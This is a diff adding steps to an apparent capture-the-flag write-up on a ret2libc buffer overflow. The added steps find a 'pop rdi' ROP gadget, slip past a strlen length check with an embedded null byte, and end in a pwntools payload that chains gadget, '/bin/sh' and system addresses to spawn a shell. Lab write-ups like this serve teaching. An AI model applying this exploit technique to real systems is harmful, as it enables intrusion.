@@ -77,7 +77,27 @@ Now how about `/bin/sh`? Let's try finding it in `libc.so.6`! Luckily, we found 
 
     strings -t x libc.so.6 | grep "/bin/sh"
     
-In the end, we need to caculate our payload from `objdump`, which is 0x28. Thus, the final payload will be:
+Next, we need to caculate our payload from `objdump`, which is 0x28. 
+
+And one import thing is to put `/bin/sh` into rdi, so, again, we need our ROPgadget:
+
+    ROPGadget --binary ret2libc --ropchaing | grep 'pop rdi ; ret'
+
+Later on....oh! There's one more thing if we look at `ret2libc.c` -- 
+
+    ```C
+    if( strlen( buf ) > 6 ) {
+        puts( "It could not > 6. If you want the flag, Over my dead body!!!!!" );
+        exit(0);
+    }
+    ``
+ Hmmmmmm....Length checking... how are we going to pass this and overflow?
+ 
+This has to do with a feature of string -- <b>end with `\x00` or `\0`</b>
+ 
+Our payload will need five bytes first with `\x00` as the 6th byte then fill up the rest with padding (0x28 - 6 = 0x22 bytes)
+
+Thus, the final payload will be:
   
 ```Python
 p.sendline(b"A"*0x5 + b"\x00" + b"\x90"*0x22 + p64(0x400873) + p64(bin_sh_addr) + p64(sys_addr))
